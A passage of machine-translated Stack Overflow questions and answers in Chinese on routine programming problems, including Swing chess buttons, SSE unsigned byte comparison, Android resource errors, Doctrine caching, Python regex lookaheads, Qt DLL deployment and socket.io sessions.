            frame.add(square[x][y]);
            if(y%2==0)
                if(x%2==0)
                    square[x][y].setBackground(Color.cyan);
                else
                    square[x][y].setBackground(Color.blue);
            else
                if(x%2==0)
                    square[x][y].setBackground(Color.blue);
                else
                    square[x][y].setBackground(Color.cyan);
        }
    }
    for(int x=0; x<8; x++)
    {
        for(int y=0; y<8; y++)
        {
            squareB[x][y] = new JButton();
            squareB[x][y] = new Chess(x,y);
            square[x][y].add(squareB[x][y]);
            squareB[x][y].setSize(square[x][y].getSize());
            squareB[x][y].setMargin(new Insets(0, 0, 100, 100));
            squareB[x][y].setContentAreaFilled( false );  
            squareB[x][y].setOpaque(false);
            squareB[x][y].setContentAreaFilled(false);
            squareB[x][y].setBorderPainted(false);
            squareB[x][y].addActionListener(this);
        }
    }
    for(int x=0; x<6; x++)
    {
        blank[x] = new JPanel();
        frame.add(blank[x]);
        if(x==2)
        {
            frame.add(newGame);
            frame.add(exitGame);
        }
    }

    JLabel WPawn = new JLabel(new ImageIcon(((new ImageIcon("C:\\Users\\Matthew\\Desktop\\Chess Pieces\\WPawn.png")).getImage()).getScaledInstance(80, 83, java.awt.Image.SCALE_SMOOTH)));
    squareB[1][1].add(WPawn);

    newGame.addActionListener(this);
    exitGame.addActionListener(this);
    frame.setVisible(true);
}
public static void main(String[] args) throws IOException
{
    new ChessGame();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:04:10.477

不要尝试将 a 添加`JLabel`到`JButton`没有布局管理器的 a 中，而是设置`JButton`s 图标

```
Image WPawn = new ImageIcon(ImageIcon("C:\\Users\\Matthew\\Desktop\\Chess Pieces\\WPawn.png").getImage().getScaledInstance(80, 83, java.awt.Image.SCALE_SMOOTH));
squareB[1][1].setIcon(WPawn); 
```

您可能想仔细看看[如何使用按钮](http://docs.oracle.com/javase/tutorial/uiswing/components/button.html)

**Ps**我也推荐[`ImageIO`](http://docs.oracle.com/javase/tutorial/2d/images/loadimage.html)阅读`ImageIcon`图片

# ios - 如何停止 MPMediaPickerController 用重复的 MPMediaItems 填充 MPMediaItemCollection？

> ID：16204654
> 
> 赞同：1
> 
> 时间：2013-04-25T00:48:45.740
> 
> 标签：ios, mpmediaitem, mpmediapickercontroller, mpmediaitemcollection

我使用此代码选择曲目

```
//open the media picker, allow the inport of any type of audio
MPMediaPickerController *mediaPickerController = [[MPMediaPickerController alloc] initWithMediaTypes: MPMediaTypeAnyAudio];

mediaPickerController.prompt = @"Choose items to import";
//we want to be able to import multiple items at once
mediaPickerController.allowsPickingMultipleItems = YES;
mediaPickerController.delegate = self; 
```

在选择项目时，`MPMediaPickerController`我注意到按两次相同的项目会将其添加到`MPMediaItemCollection`两次。当我将曲目导入我的应用程序时，我最终导入了两次。

我想要一种方法来指定轨道只添加一次，或者如果失败，则能够从选择中过滤掉重复的轨道。如果这是可能的，我将如何去做？

我的目标是iOS5。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T03:15:05.780

不久前我遇到了这个问题，不幸的是，如果不从头开始重新制作选择器（可行），就无法指定是否允许重复。但是，选择后检查和删除重复项相对容易。

如下所述，有几个选项，但区别实际上归结为您是否希望保留集合最初的顺序。

第一个基本上只是循环遍历集合中的项目，如果辅助数组不包含该对象，则将其复制出来。第二个将集合中的所有对象复制到一个 NSSet 中，该 NSSet 将删除所有重复项，然后复制回来。该解决方案根本不保持秩序。

```
- (void)mediaPicker:(MPMediaPickerController *)mediaPicker didPickMediaItems:(MPMediaItemCollection *)mediaItemCollection {
    MPMediaItemCollection *dupeFreeCollection = nil;

    if (shouldPreserveOrder) {
        //Will preserve order, with exception of subtracted duplicates

        NSMutableArray *newCopy = [NSMutableArray new];
        for (MPMediaItem *item in mediaItemCollection.items) {
            if (![newCopy containsObject:(MPMediaItem *)item]) {
                [newCopy addObject:(MPMediaItem *)item];
            }
        }
        dupeFreeCollection = [[MPMediaItemCollection alloc] initWithItems:newCopy];

    }else{
        //Will not preserve order

        NSSet *set = [[NSSet alloc] initWithArray:mediaItemCollection.items];
        dupeFreeCollection = [[MPMediaItemCollection alloc] initWithItems:[set allObjects]];
    }
} 
```

请记住，我包含的代码未经测试，因为我似乎找不到 iPhone 电缆，但它应该足以让你继续前进。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-24T12:19:58.257

```
 In swift 

        for i in 0 ..< mediaItemCollection.items.count {
                    let representativeItem: MPMediaItem = mediaItemCollection.items[i]
                    let title = representativeItem.title
                    let artist = representativeItem.artist
                    let imageSound: MPMediaItemArtwork = (representativeItem.value( forProperty: MPMediaItemPropertyArtwork ) as? MPMediaItemArtwork)!
                    let itemUrl = representativeItem.value(forProperty: MPMediaItemPropertyAssetURL) as? NSURL

                    SongDict = NSMutableDictionary()
                    self.setSongData(title, artist: artist, img: imageSound.image(at: CGSize(width: 55, height: 55))!, url:itemUrl!)
                    songArray .insert(SongDict, at: i)
                }

      func setSongData(_ title: String?, artist: String?, img :UIImage , url: NSURL?) {
            SongDict["title"] = title
            SongDict["artist"] = artist
            SongDict["image"] = img
            SongDict["url"] = url
        }

Now you can delete below code 

 let indexPath = IndexPath(row: sender.tag, section: 0)
  self.tbl_Song.beginUpdates()
  self.songArray.removeObject(at: indexPath.row)
  self.tbl_Song.deleteRows(at: [indexPath], with: .left)
  self.tbl_Song.endUpdates() 
```

# x86 - SSE 比较压缩无符号字节

> ID：16204663
> 
> 赞同：5
> 
> 时间：2013-04-25T00:51:00.587
> 
> 标签：x86, comparison, unsigned, sse

我正在尝试使用 SSE 指令进行一些图像过滤。我正在使用的图像每个像素有一个字节（255 灰度），我需要使用大于比较来比较无符号打包字节。我查看了英特尔的手册，并且存在比较，但仅适用于有符号字节（PCMPGTB）。我怎样才能对无符号字节进行比较？提前致谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2014-06-15T22:34:47.487

^(在 AVX-512 1)之前，确实不可能直接进行无符号比较。

但是您可以将 -128 添加到每个值（或减去 128，或 XOR 0x80，或类似的）。这会将 0 变为 -128，将 255 变为 127，其他值变为介于两者之间的值；结果是您从比较中获得了正确的结果。

将其扩展为单词也应该有效，但听起来有点慢，因为您完成了每条指令的一半工作。

```
_mm_cmpgt_epu8(a, b) = _mm_cmpgt_epi8(
        _mm_xor_epi8(a, _mm_set1_epi8(-128)),  // range-shift to unsigned
        _mm_xor_epi8(b, _mm_set1_epi8(-128))) 
```

`pxor`可以在比某些 CPU 上更多的执行端口上运行`paddb`，因此如果您需要这样做，它通常是最佳选择。XOR 是无进位加法，加减 0x80 的进位输出到每个字节元素的顶部。

* * *

**脚注 1：使用 AVX-512BW：**

[`vpcmpub`](https://www.felixcloutier.com/x86/vpcmpb:vpcmpub)它将比较谓词作为立即数，例如`cmpps`. `_mm_cmp[eq|ge|gt|le|lt|neq]_epu8_mask`比较到掩码而不是另一个向量，因为这就是 AVX-512 比较指令的工作方式。例如
`__mmask16 _mm_cmpgt_epu8_mask (__m128i a, __m128i b)` [在英特尔的内在指南中](https://software.intel.com/sites/landingpage/IntrinsicsGuide/#techs=SSE,SSE2,SSE3,SSSE3,SSE4_1,SSE4_2,AVX,AVX2,AVX_512,Other&expand=5322,941&text=pcmpub)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-02-07T14:08:54.353

无符号比较 (a >= b) 与 maxu( a, b ) == a 相同，因此您可以使用

```
_mm_cmpeq_epi8( a, _mm_max_epu8(a,b))   -->   a >= b  "cmpge_epu8(a,b)" 
```

如果您需要一个 `<`或`>`比较，您需要反转结果，此时 Alcaro 的方法可能同样好（尽管该方法需要一个寄存器来携带一个用于反转的常数）。但是对于 a `>=`or`<=`比较，这肯定更好（因为没有 _mm_cmple_epi8 或 _mm_cmpge_epi8 可供使用，即使在将无符号转换为有符号范围之后）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-09-25T10:51:00.030

对@greggo 的解决方案提出一个小而重要的改进：

```
maxu( a, b ) == a 
```

有一个缺点，因为您必须在 maxu 比较之前备份“a”，从而导致补充操作，如下所示：

```
movq mmc, mma
pmaxu mma, mmb
pcmpeq mma, mmc 
```

这

```
minu( a, b ) == b 
```

给出完全相同的效果，但保留了相等检查的运算符：

```
pminu mma, mmb
pcmpeq mma, mmb 
```

收益是显着的：只需 2 次操作而不是 3 次。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-27T19:17:56.347

除了比较打包的无符号字节之外，不可能做得更好，我已经将字节解包为单词（因为它们是肯定的，就像从无符号到有符号的转换以及从字节到单词的扩展）并使用 PCMPGTB 比较它们。

# c - 在 C 中执行 LLVM IR 代码

> ID：16204665
> 
> 赞同：3
> 
> 时间：2013-04-25T00:51:16.170
> 
> 标签：c, llvm, clang, llvm-ir

我一直在试图弄清楚如何基本上采用 LLVM IR 代码的一部分并在 C 中*内联*执行它。我希望能够内联 IR 代码，这样就不需要虚拟函数调用（在同一可以使用`_asm{}`) 内联汇编代码的方式。请参见以下示例：

要执行的 LLVM IR 代码：

```
define i64 @square(i64 %x){
    %y = mul i64 %x, %x
    ret i64 %y
} 
```

C程序：

```
for(i = 0; i < length; i++){
   //run LLVM IR Code here
} 
```

我知道我可以在使用中读取 IR 代码`parseIRFile()`并创建一个指向函数的指针，但这不是我想要的，因为需要一个虚拟函数调用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T05:02:17.590

首先，不涉及虚函数——C没有这样的概念。我认为您的意思是*间接*函数调用，即获取函数指针并调用它指向的函数。

简短的回答是*不*，没有直接的方法可以将 LLVM IR 嵌入到 C 中并让它与您的代码一起编译：[请参阅这个相关问题和我的回答](https://stackoverflow.com/q/15354488/242762)。正如我在那里提到的，如果你想让程序员编写 LLVM IR 并且仍然坚持直接函数调用，你应该将 IR 封装在一个函数中并将它放在一个单独的文件中。

如果嵌入 IR 比性能更重要，那么您将不得不使用该`ParseIR()`路线（不需要`ParseIRFile()`- 您可以直接从内存中解析）。

我想您可以在构建过程中引入一些脚本，该脚本采用混合 C/IR 输入文件，将其拆分为两个文件，然后将它们编译在一起，并适当地修改 IR 中的调试信息以使其表现得好像它是真正嵌入的在 C 文件中。但这是一种非常hacky的方法，无论哪种方式，输入文件都不是合法的C文件。

# c# - 如何从数据列表中获取文本框值？

> ID：16204666
> 
> 赞同：1
> 
> 时间：2013-04-25T00:51:31.900
> 
> 标签：c#, asp.net, datalist, findcontrol

我正在使用数据列表来显示产品 ID、名称和文本框（“数量”），允许用户输入订单数量。我得到 System.NullReferenceException：当用户单击要订购的项目时，对象引用未设置为对象错误的实例。我的数据源仅提供 2 列（产品 ID 和名称）。我在数据列表中添加了一个文本框（“数量”）和一个按钮。我无法从要提交的文本框（“数量”）中获取值。难道是我的数据源不包含“数量”列，因此 FindControl 总是返回空值？我该如何解决这个问题？谢谢。这是我的代码：

```
<asp:DataList ID="DataList1" runat="server" CellPadding="10" DataKeyField="product_id" DataSourceID="SqlDataSource1" RepeatColumns="2">
 <ItemTemplate>
  <asp:Label ID="product_id" runat="server" 
     Text='<%# Eval("product_id") %>' /><br/>
  <asp:Label ID="product_name" runat="server" 
     Text='<%# Eval("product_name") %>' />
 <br />

<asp:TextBox ID="Qty" runat="server"></asp:TextBox>
<asp:Button ID="ButtonAddToCart" runat="server" Text="Add to Cart" CommandName="addtocart2"   OnCommand="DataList1_ItemCommand"
    />  
</ItemTemplate>
</asp:DataList> 
```

这是按钮的代码：

```
public void DataList1_ItemCommand(object source, System.Web.UI.WebControls.CommandEventArgs e)

{
 var qtytxtbox =  DataList1.FindControl("Qty") as TextBox;
 // qtytxtbox always return null, why?

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:00:52.923

您的处理程序看起来不正确。您应该`DataListCommandEventArgs`用作第二个参数。所以尝试这样的事情

标记：

```
<asp:DataList ID="DataList1" runat="server" OnItemCommand="DataList1_ItemCommand" vCellPadding="10" DataKeyField="product_id" DataSourceID="SqlDataSource1" RepeatColumns="2"> 
```

然后在按钮中添加命令名称

```
<asp:Button ID="ButtonAddToCart" runat="server" Text="Add to Cart" CommandName="addtocart2" /> 
```

和后面的代码

```
public void DataList1_ItemCommand(object source, DataListCommandEventArgs e)
{
  if(e.CommandName.Equals("addtocart2")
  {
    TextBox qtytxtbox = (TextBox)(e.Item.FindControl("Qty"));
  }
} 
```

# android - findViewById() 上的 NoSuchFieldError

> ID：16204667
> 
> 赞同：30
> 
> 时间：2013-04-25T00:51:41.010
> 
> 标签：android, runtime-error, findviewbyid

我要合并两个android项目，一个是Main，另一个是链接为Library。但是我在这条线上有一些麻烦：

```
Button modificarC;
protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.activity_menu_calificaciones);
modificarC = (Button) findViewById(R.id.btn_aseso); //HERE 
```

我尝试了 Project Clean ... 我的依赖项也有 android-support-v4.jar

这是我的踪迹：

```
04-24 19:39:52.568: E/AndroidRuntime(9486): FATAL EXCEPTION: main
04-24 19:39:52.568: E/AndroidRuntime(9486): java.lang.NoSuchFieldError: com.utez.sistemas.sam.R$id.btn_aseso
04-24 19:39:52.568: E/AndroidRuntime(9486):     at com.utez.sistemas.sam.calificaciones.CalificacionesActivity.onCreate(CalificacionesActivity.java:67)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.Activity.performCreate(Activity.java:4465)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1052)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1932)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1993)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.ActivityThread.access$600(ActivityThread.java:127)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1159)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.os.Looper.loop(Looper.java:137)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at android.app.ActivityThread.main(ActivityThread.java:4507)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at java.lang.reflect.Method.invokeNative(Native Method)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at java.lang.reflect.Method.invoke(Method.java:511)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:790)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:557)
04-24 19:39:52.568: E/AndroidRuntime(9486):     at dalvik.system.NativeStart.main(Native Method) 
```

这里也是布局：

```
<LinearLayout
            style="@style/LoginFormContainer"
            android:layout_width="253dp"
            android:layout_height="260dp"
            android:layout_marginLeft="15dp"
            android:layout_marginTop="30dp"
            android:orientation="vertical" >

            <Button
                android:id="@+id/btn_alta"
                android:layout_width="match_parent"
                android:layout_height="63dp"
                android:layout_marginLeft="25dp"
                android:layout_marginTop="5dp"
                android:background="@drawable/btn_altacalif"
                android:contentDescription="@string/action_sign_in_register"
                android:paddingLeft="32dp"
                android:paddingRight="32dp"
                android:textAlignment="center" />

            <Button
                android:id="@+id/btn_aseso"
                android:layout_width="match_parent"
                android:layout_height="0dp"
                android:layout_marginLeft="25dp"
                android:layout_marginTop="5dp"
                android:layout_weight="0.16"
                android:background="@drawable/btn_modcalif"
                android:contentDescription="@string/action_sign_in_register"
                android:paddingLeft="32dp"
                android:paddingRight="32dp"
                android:textAlignment="center" />

        </LinearLayout> 
```

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2013-05-21T15:45:13.980

我有同样的错误，结果证明资源被覆盖了。

如果您有一个项目作为在给定 XML 文件中声明某个 id 的库工作，那么您的主项目重新定义该 XML，原始 id 消失了，但直到运行时您才会看到错误。

就我而言，合作伙伴从项目中删除并提交了 XML，然后将其添加回库项目中。Subclipse 似乎没有注意到这一点，因为我是最新的，但 XML 存在于主项目中。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2014-03-17T04:00:24.870

嗯，我是中国人。我的英语不是很好。

我也有问题。

**解决方法可能是：** xml文件名重复，例如：a.xml在你的库项目中，同时a.xml在你的主项目中。所以，请更改其中一个 xml 名称。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-08-04T17:06:12.727

要详细说明@Moxor 的解决方案，您可以：

1.  声明一个虚拟布局 xml，并将缺少的 id 分配给一些虚拟视图。
2.  将缺少的 id 声明为资源，与声明字符串资源的方式相同：http: [//developer.android.com/guide/topics/resources/more-resources.html#Id](http://developer.android.com/guide/topics/resources/more-resources.html#Id)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-07-18T10:33:40.077

清理项目对我有用。

# php - symfony2/doctrine2 中的异常行为

> ID：16204668
> 
> 赞同：1
> 
> 时间：2013-04-25T00:52:27.273
> 
> 标签：php, symfony, doctrine-orm

我有以下问题：

我想在将对象保存到数据库之前检查一些东西：

这是我的控制器：

```
/**
 * Edits an existing Document entity.
 *
 * @Route("/{id}", name="document_update")
 * @Method("PUT")
 * @Template("ControlBundle:Document:edit.html.twig")
 */
 public function updateAction(Request $request, $id) {
        $em = $this->getDoctrine()->getManager();    
        $entity = $em->getRepository('ControlBundle:Document')->find($id);

        if (!$entity) {
            throw $this->createNotFoundException('Unable to find Document entity.');
        }

        $deleteForm = $this->createDeleteForm($id);
        $editForm = $this->createForm(new DocumentType(), $entity);
        $editForm->bind($request);

        if ($editForm->isValid()) {
           $document = $em->getRepository('ControlBundle:Document')->findOneBy(array(
            'id' => $id,
            ));

           if ($document->getCount() > 100)
              $em->flush();
        }

      return array(
        'entity' => $entity,
        'edit_form' => $editForm->createView(),
        'delete_form' => $deleteForm->createView(),
     );
  } 
```

在我的数据库中，我有：

```
id   count .......
23    110 
```

在我的表格中我编辑：

```
id   count .......
23    34 
```

但是当我这样做时：

```
$document = $em->getRepository('ControlBundle:Document')->findOneBy(array(
   'id' => $id,
));

//here $document->getCount() return 34; ------WHY? should return 110!!!
if ($document->getCount() > 100)
   $em->flush(); 
```

最好的问候：D

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T06:26:58.493

Doctrine Entity Manager**已经在管理这个实体**（ID=23 的文档），它不会第二次从数据库中重新加载数据，它只是使用它已经管理的实体，其***计***数值已被表格中的 34 替换...

尝试这个 ：

```
 /**
  * Edits an existing Document entity.
  *
  * @Route("/{id}", name="document_update")
  * @Method("PUT")
  * @Template("ControlBundle:Document:edit.html.twig")
  */
 public function updateAction(Request $request, $id) {
    $em = $this->getDoctrine()->getManager();    
    $entity = $em->getRepository('ControlBundle:Document')->find($id);

    if (!$entity) {
        throw $this->createNotFoundException('Unable to find Document entity.');
    }

    $lastCountValue = $entity->getCount();

    $deleteForm = $this->createDeleteForm($id);
    $editForm = $this->createForm(new DocumentType(), $entity);
    $editForm->bind($request);

    if ($editForm->isValid() && lastCountValue > 100) {
        $em->flush();
    }

  return array(
    'entity' => $entity,
    'edit_form' => $editForm->createView(),
    'delete_form' => $deleteForm->createView(),
 ); 
```

}

# python - 多个否定前瞻断言

> ID：16204675
> 
> 赞同：3
> 
> 时间：2013-04-25T00:53:18.503
> 
> 标签：python, regex

我无法弄清楚如何为我的生活进行多次环视。假设我想匹配散列后的可变数量的数字，但如果前面有某些东西或后面有其他东西，则不匹配。例如我想在下面匹配#123 或#12345。后视似乎很好，但前瞻却不行。我没主意了。

```
matches = ["#123", "This is #12345",
           # But not
           "bad #123", "No match #12345", "This is #123-ubuntu", 
           "This is #123 0x08"]

pat = '(?<!bad )(?<!No match )(#[0-9]+)(?! 0x0)(?!-ubuntu)'

for i in matches:
    print i, re.search(pat, i) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:58:26.000

你也应该看看捕获。我打赌你会得到最后两个字符串：

```
#12 
```

这就是发生的事情：

引擎检查两个lookbehinds - 他们不匹配，所以它继续捕获组`#[0-9]+`和matches `#123`。现在它检查前瞻。他们如愿以偿。但现在有回溯！模式中有一个变量，那就是`+`. 所以引擎会丢弃最后一个匹配的字符 ( `3`) 并再次尝试。现在，前瞻不再有问题，并且您得到了匹配。解决此问题的最简单方法是添加另一个前瞻，以确保您转到最后一位：

```
pat = r'(?<!bad )(?<!No match )(#[0-9]+)(?![0-9])(?! 0x0)(?!-ubuntu)' 
```

请注意原始字符串（前导`r`）的使用——在这种模式中并不重要，但这通常是一个好习惯，因为一旦你开始转义字符，事情就会变得难看。

**编辑：**如果你正在使用或愿意使用[`regex`](https://pypi.python.org/pypi/regex)包而不是`re`，你会得到所有格量词，它会抑制回溯：

```
pat = r'(?<!bad )(?<!No match )(#[0-9]++)(?! 0x0)(?!-ubuntu)' 
```

由您决定哪个更具可读性或可维护性。不过，后者的效率会稍微高一些。（感谢 nhahtdh 将我指向`regex`包裹。）

# qt - OpenGL Widget 在创建者中工作，但从 .exe 启动时为黑色

> ID：16204678
> 
> 赞同：2
> 
> 时间：2013-04-25T00:53:39.210
> 
> 标签：qt, opengl, qt-creator, qt5

我已经在 Qt OpenGL 项目上工作了一段时间，以完成一些学校工作。我必须为我的 Windows 机器重新构建 Qt 5.0.1，这样我才能正确使用 OpenGL。在这个项目结束时，我需要交出文件和任何可执行文件，所以我想我可以将发布的 .exe 文件粘贴到 .zip 文件中以供使用。

我按照在线说明确保将任何需要的 .dll 放入 .exe 的目录中。我的项目有 10 个：icudt49、icuin49、icuuc49、libEGL、libGLESv2、Qt5Core、Qt5Gui、Qt5OpenGL 和 Qt5Widgets

我把这些文件全部取自：C:\Qt\Qt5.0.1\5.0.1\msvc2010\bin

在我的系统上。

问题是 .exe 将运行，我得到 UI 和所有。但是 OpenGL 场景只是黑色的。我仍然可以单击场景中的对象，显然可以放大和缩小等等。我认为这仍然只是 Qt 翻译命令。但什么都看不见。我不确定问题出在哪里，因为从创建者启动时一切正常。

编辑：因此，对于发布文件夹中的**所有**dll，从创建者中运行项目也会出现黑屏，当我删除它们时，它运行良好。那么也许其中一个dll是错误的？

另外：我在网上查看了有关使用 Qt Creator 发布的信息，发现没有太多帮助，说我应该从完全静态重建 Qt Creator 开始，但我确信我遵循的指南做到了这一点，但是我仍然无法从构建菜单，所以我坚持使用上述方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T09:24:34.393

我建议您使用 Dependency Walker ( [http://www.dependencywalker.com/](http://www.dependencywalker.com/) ) 打开 Zip 文件中的每个 DDL。它应该显示有关从您的 QtXXX.dll 文件之一到其他文件的依赖关系的信息。如果缺少其中一个依赖项，您就知道下一步该往哪里看。您也可以尝试使用 Dependency Walker 打开可执行文件。我很长时间没有使用该程序，所以我不记得打开可执行文件是否是它工作的唯一方式。无论如何，以下是您可能想要使用该工具的原因：http: [//www.dependencywalker.com/help/html/overview_1.htm](http://www.dependencywalker.com/help/html/overview_1.htm)

这个问题也可能有帮助：

[由于隐式依赖模块中缺少导出函数，至少有一个模块存在未解析的导入](https://stackoverflow.com/questions/4958858/at-least-one-module-has-an-unresolved-import-due-to-a-missing-export-function-in)

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T21:06:07.280

所以最终的问题是使用正确的 DLL。使用 DependenyWalker 之类的东西可以帮助您注意哪些 DLL 可能丢失，但在我的情况下它什么也没做。

我已经安装了一次 Qt，并且还重新构建、卸载并重新安装了它。然而，它调用的所有库不再像预期的那样在 C:\Qt\Qt5.0.1\5.0.1\msvc2010\bin 中，而是从我构建它的 github 存储库 C:\Users\User\Documents 调用\GitHub\qt5\. 一旦解决了这个问题，它仍然需要一个框架文件夹，然后它可以按预期工作。

1) 将正确的 DLL 文件复制到构建的发布文件夹中。

2) 在与名为“platforms”的 .exe 相同的目录中创建一个文件夹。（注意：其他地方说创建插件>平台，但这不适用于较新的 Qt 版本）

3) 从您获得其他 DLL 的同一来源，将 qwindows.dll 复制到您创建的平台文件夹中。

4）运行可执行文件并享受。

只要您运行的系统能够支持您的 OpenGL 结构，就应该没问题。

# node.js - Node.js - 试图避免全局变量......我如何跟踪用户对象？

> ID：16204679
> 
> 赞同：1
> 
> 时间：2013-04-25T00:53:50.803
> 
> 标签：node.js, express, session-cookies, passport.js

好的，这就是场景。我让用户使用 facebook 登录我的应用程序。发生这种情况时，Passport 会将其保存到 Session (req.user)。当我在可以访问请求对象的页面中工作时，这一切都很好，但是我发现自己处于无法访问请求但我需要检查用户对象的情况。

举个例子。我正在使用 socket.io，当我使用套接字及其周围的方法时，我无权访问请求对象，因此无法获取用户信息。

我一直听说我需要尽可能远离全局变量，但我看不到绕过它的方法。

想法？

下面是我使用套接字的示例。这个模块是从我的 server.js 文件中调用的。

```
function loadSockets(io)
{
    var articleCommand = require('./middleware/ArticleCommand');

    io.sockets.on('connection', function (socket) {
        socket.on('getArticles', function(){
            if (NEED USER INFO HERE !== null){
                articleCommand.getArticlesByUser(NEED USER INFO HERE, function(error, articles){
                    io.sockets.emit('articlesRetrieved', error, articles);
                });
            }
        });
    });
}

exports.loadSockets = loadSockets; 
```

* * *

**更新**

好的，所以根据评论者的建议，我已经安装了这个：[https](https://github.com/aviddiviner/Socket.IO-sessions) ://github.com/aviddiviner/Socket.IO-sessions并应用了它......但我的会话在我的套接字中始终为空。

这就是我所拥有的。

```
var socket = sio.enable({
    socket: io.listen(server, {'log level': 1, 'heartbeat': false}),   
    store:  mystore,                // this is my Redis store
    parser: express.cookieParser()
}); 
```

稍后...在处理我的套接字时

```
socket.sockets.on('connection', function (socket, session) { ... 
```

会话始终为空......即使我的护照已正确加载我的会话。

想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T13:04:48.170

好的，为了后代，这就是我为解决此问题所做的工作。

您可以从我上面的更新中看到，我尝试使用 SocketIO-sessions 模块，但没有奏效。

经过更多研究后，我发现我需要确保我获得了护照会话，因为这就是我的身份验证。

我发现了这个小宝石：[https ://github.com/jfromaniello/passport.socketio](https://github.com/jfromaniello/passport.socketio)

这就像一个魅力。唯一需要弄清楚的是正确设置密钥（他们假设您知道如何在示例中执行此操作）。

```
sio.set("authorization", passportSocketIo.authorize({
    key:    'MYKEY',       
    secret: 'SECRET',
    store:   mySessionStore
})); 
```

开箱即用，您的密钥未设置。为此，只需使用您的应用程序进行设置，如下所示：

```
app.use(express.session({
    secret: "SECRET",
    store: mySessionStore,
    key: 'MYKEY',
    cookie: { secure: false, maxAge:86400000 }
})); 
```

希望这可以帮助某人。

大卫

# youtube - PHP Youtube API v3 播放列表项中缺少描述

> ID：16204680
> 
> 赞同：1
> 
> 时间：2013-04-25T00:53:57.193
> 
> 标签：youtube, google-api, youtube-api

[当我使用 OAuth 2.0 和此处提供的示例代码https://developers.google.com/youtube/v3/docs/playlistItems/list](https://developers.google.com/youtube/v3/docs/playlistItems/list)通过 Youtube Data API v3 查询上传的视频时，我没有得到描述表。

这可能是一个错误吗？我的所有视频都不是私人视频，回复中唯一缺少的是视频的描述！

我正在使用 PHP 库，“part”参数是片段（不知道这是否有帮助）。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:11:40.107

我相信这是有意为之，因为在 YouTube 上查看播放列表时不会显示视频说明。

如果您希望包含上传视频的说明，请考虑改用[YouTube API v3 Search: list](https://developers.google.com/youtube/v3/docs/search/list)。*将在snippet/description*下为您的视频提供省略号截断的描述。同样，此行为类似于在 YouTube 上进行搜索，其中描述被截断。

如果需要完整描述，您需要使用[Videos: list](https://developers.google.com/youtube/v3/docs/videos/list)。
或者，使用 API 的第 2 版：[https: **//gdata.youtube.com/feeds/api/users/youtube_username/uploads** ?max-results=50&start-index=1](https://gdata.youtube.com/feeds/api/users/youtube_username/uploads?max-results=50&start-index=1)。

# apache - .htaccess 文件没有 time_mon、time_year apache vars 的值

> ID：16204687
> 
> 赞同：0
> 
> 时间：2013-04-25T00:54:33.827
> 
> 标签：apache, .htaccess, mod-rewrite, url-rewriting, environment

我正在尝试通过.htaccess 重写一些apache URL。我想根据时间和日期重写。我们希望某些图像在 6 月份显示，而其他图像在 6 月之后显示。

所以在我的 .htaccess 文件中，我有：

```
RewriteCond %{TIME_MON} = 05
RewriteRule ^Google_LP.png /img/img/ids/bg.png 
```

但是我现在在网站上收到 500 个错误，所以这里肯定有错误。当我通过 phpinfo() 显示我的 apache ENV 变量时，我看到任何 apache 时间变量都没有值——TIME_MON、TIME_YEAR、TIME_MIN 等不存在。我确实看到了一个 REQUEST_TIME，但它是自纪元以来的秒数。

TIME_MON 中什么都没有是有原因的吗？它是apache配置吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:00:37.330

`=`和之间不允许有空格`05`。尝试

```
RewriteCond %{TIME_MON} =05 
```

# python - Python请求：如何将字符串放入正文？

> ID：16204690
> 
> 赞同：2
> 
> 时间：2013-04-25T00:54:41.160
> 
> 标签：python, http, rest, python-requests

我需要将字符串（无字典）中的数据作为对 REST API 的调用主体。
当我打电话

```
r = requests.put(url, data = string) 
```

然后我可以在`r.request.body`这个电话之后看到它是`None`。此外，服务器响应“411 长度要求”错误。

但是，当我使用 dict 而不是字符串尝试它时，它会起作用，因为服务器会使用正确的 JSON 数据进行响应。此外，在那种情况下，我可以看到`r.request.body`正确的数据。

有任何想法吗？

PS：我正在使用 Python 2.7.3 和 Python-requests 1.2.0

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T01:08:39.493

